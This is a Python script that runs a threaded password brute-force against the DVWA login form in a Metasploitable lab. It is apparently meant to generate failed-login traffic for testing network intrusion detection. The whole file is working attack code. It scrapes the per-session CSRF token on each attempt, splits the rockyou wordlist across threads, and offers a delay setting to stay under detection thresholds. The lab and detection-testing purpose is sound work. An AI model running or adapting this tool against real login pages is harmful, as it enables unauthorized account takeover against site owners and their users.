"""
DVWA BRUTE-FORCE DEMO — adapted from attack_demo.py for a Metasploitable/Kali lab range.

Target: DVWA login form (Metasploitable, http://<target-ip>/dvwa/login.php)
Purpose: generate a realistic brute-force traffic pattern for NIDS event-correlation testing.

NOTE ON SCOPE:
  Unlike the practice Flask app, DVWA's login does NOT leak whether a username
  exists — it always replies "Login failed". So there is no meaningful
  "username enumeration" phase here. This script focuses on the brute-force
  phase, which is what actually produces the kind of repeated-failed-auth
  burst that a NIDS correlation engine is built to catch.

Usage:
  python dvwa_attack_demo.py --target 192.168.56.105 --wordlist /usr/share/wordlists/rockyou.txt \
      --username admin --threads 4 --delay 0.1

Run this only against hosts you own/operate (e.g. your Metasploitable VM).
"""

import argparse
import re
import sys
import time
import threading
from datetime import datetime

import requests

DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"
TOKEN_RE = re.compile(r"user_token['\"]\s+value=['\"]([a-f0-9]+)['\"]", re.IGNORECASE)


def ts() -> str:
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]


def log(msg: str):
    print(f"[{ts()}] {msg}", flush=True)


# ─────────────────────────────────────────────────────────────
# DVWA issues a fresh CSRF token (`user_token`) per session and
# rejects any login POST that doesn't carry the matching token.
# We have to fetch the login page, scrape the token + PHPSESSID,
# and resend both with every attempt.
# ─────────────────────────────────────────────────────────────

def fetch_login_form(session: requests.Session, login_url: str) -> str | None:
    r = session.get(login_url, timeout=10)
    m = TOKEN_RE.search(r.text)
    return m.group(1) if m else None


def attempt_login(session: requests.Session, login_url: str,
                  username: str, password: str) -> tuple[bool, str | None]:
    token = fetch_login_form(session, login_url)
    if token is None:
        return False, None  # couldn't get a token — treat as a failed attempt, not a crash

    r = session.post(login_url, data={
        "username": username,
        "password": password,
        "Login": "Login",
        "user_token": token,
    }, timeout=10, allow_redirects=True)

    # DVWA: success redirects to index.php and shows the nav menu;
    # failure re-renders login.php with "Login failed" in the body.
    success = "Login failed" not in r.text and ("index.php" in r.url or "Welcome" in r.text)
    return success, token


# ─────────────────────────────────────────────────────────────
# Threaded brute force with a configurable per-thread delay.
#   --threads N   -> concurrency (loud/fast attack pattern)
#   --delay   S   -> seconds to sleep between each attempt per thread
#                    (lets you dial the attack down to "slow and low"
#                    to test whether your NIDS correlation still
#                    catches it over a longer window)
# ─────────────────────────────────────────────────────────────

_found = {"password": None}
_lock = threading.Lock()
_stop = threading.Event()


def worker(thread_id: int, login_url: str, username: str,
           passwords: list[str], delay: float, counters: dict):
    session = requests.Session()
    for pwd in passwords:
        if _stop.is_set():
            return
        ok, _ = attempt_login(session, login_url, username, pwd)
        with _lock:
            counters["count"] += 1
            n = counters["count"]
        if ok:
            with _lock:
                if _found["password"] is None:
                    _found["password"] = pwd
                    log(f"[+] PASSWORD FOUND by thread-{thread_id}: '{pwd}' (attempt #{n})")
            _stop.set()
            return
        if n % 50 == 0:
            log(f"[*] {n} attempts so far... (thread-{thread_id} last tried '{pwd}')")
        if delay > 0:
            time.sleep(delay)


def brute_force_dvwa(target_ip: str, username: str, wordlist_path: str,
                     threads: int, delay: float, limit: int | None):
    login_url = f"http://{target_ip}/dvwa/login.php"

    print("=" * 60)
    log(f"DVWA BRUTE FORCE — target user '{username}'")
    log(f"Login URL : {login_url}")
    log(f"Threads   : {threads}  |  Per-thread delay: {delay}s")
    print("=" * 60)

    try:
        with open(wordlist_path, "r", encoding="latin-1") as f:
            passwords = [l.strip() for l in f if l.strip()]
            if limit:
                passwords = passwords[:limit]
        log(f"Loaded {len(passwords)} candidate passwords from {wordlist_path}")
    except FileNotFoundError:
        log(f"[!] Wordlist not found at {wordlist_path} — falling back to small built-in list")
        passwords = ["password", "admin", "letmein", "123456", "dvwa", "p@ssw0rd", "changeme"]

    # Quick reachability / form check before launching threads
    probe = requests.Session()
    if fetch_login_form(probe, login_url) is None:
        log(f"[!] Could not reach or parse login form at {login_url}")
        log("    Check the target IP, that DVWA is up, and that the path is /dvwa/login.php")
        sys.exit(1)

    chunk_size = max(1, len(passwords) // threads + 1)
    chunks = [passwords[i:i + chunk_size] for i in range(0, len(passwords), chunk_size)]

    counters = {"count": 0}
    start = time.time()
    workers = []
    for i, chunk in enumerate(chunks):
        t = threading.Thread(target=worker, args=(i, login_url, username, chunk, delay, counters))
        t.start()
        workers.append(t)

    for t in workers:
        t.join()

    elapsed = time.time() - start
    print("=" * 60)
    if _found["password"]:
        log(f"RESULT: cracked '{username}' password = '{_found['password']}'")
    else:
        log(f"RESULT: not found in {counters['count']} attempts")
    log(f"Total attempts: {counters['count']}  |  Elapsed: {elapsed:.1f}s  "
        f"|  Rate: {counters['count']/elapsed:.1f} req/s")
    print("=" * 60)


def main():
    p = argparse.ArgumentParser(description="DVWA brute-force demo for NIDS correlation testing")
    p.add_argument("--target", required=True, help="Metasploitable IP, e.g. 192.168.56.105")
    p.add_argument("--username", default="admin", help="DVWA account to target (default: admin)")
    p.add_argument("--wordlist", default=DEFAULT_WORDLIST,
                   help=f"Password wordlist path (default: {DEFAULT_WORDLIST})")
    p.add_argument("--threads", type=int, default=1, help="Concurrent worker threads (default: 1)")
    p.add_argument("--delay", type=float, default=0.0,
                   help="Seconds to sleep between attempts per thread — use this to "
                        "simulate a slow-and-low attack for correlation testing (default: 0)")
    p.add_argument("--limit", type=int, default=None,
                   help="Cap the number of passwords tried (handy for quick test runs against "
                        "a multi-million-line wordlist like rockyou.txt)")
    args = p.parse_args()

    brute_force_dvwa(args.target, args.username, args.wordlist,
                     args.threads, args.delay, args.limit)


if __name__ == "__main__":
    main()
